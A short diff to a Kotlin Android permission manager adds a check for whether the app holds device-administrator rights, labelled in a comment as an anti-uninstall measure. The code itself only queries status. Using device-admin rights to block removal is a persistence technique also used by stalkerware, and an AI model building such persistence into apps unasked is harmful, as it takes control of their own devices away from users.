@@ -87,4 +87,11 @@ object PermissionManager {
         }
         return true
     }
+
+    // 6. Device Admin (Anti-Uninstall)
+    fun isAdmin(ctx: Context): Boolean {
+        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
+        return dpm.isAdminActive(comp)
+    }
 }
